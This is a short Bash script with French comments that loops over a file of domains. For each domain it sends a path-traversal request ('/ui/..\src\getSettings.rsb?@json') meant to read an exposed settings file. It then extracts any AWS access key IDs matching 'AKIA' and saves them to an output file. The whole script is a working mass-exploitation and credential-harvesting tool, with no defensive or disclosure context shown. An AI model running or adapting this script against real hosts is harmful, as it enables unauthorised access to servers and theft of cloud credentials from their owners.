#!/bin/bash

# Vérifier les arguments en ligne de commande
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <domains_file> <output_file>"
    exit 1
fi

domains_file="$1"
output_file="$2"

if [ ! -f "$domains_file" ]; then
    echo "Le fichier de domaines '$domains_file' n'existe pas."
    exit 1
fi

while IFS= read -r domain || [ -n "$domain" ]; do
    request_url="${domain}/ui/..\\src\\getSettings.rsb?@json"

    response=$(curl -s "$request_url")

    if [ $? -eq 0 ]; then
        akia_keys=$(echo "$response" | grep -oP 'AKIA[A-Z0-9]{16}')

        if [ -n "$akia_keys" ]; then
            echo "Clés AKIA trouvées dans le contenu de $domain"
            echo "Clés AKIA trouvées dans $domain:" >> "$output_file"
            echo "$akia_keys" >> "$output_file"
        else
            echo "Aucune clé AKIA trouvée dans le contenu de $domain"
        fi
    else
        echo "Échec de la requête sur $domain"
    fi
done < "$domains_file"

echo "Terminé. Les clés AKIA trouvées ont été enregistrées dans $output_file"
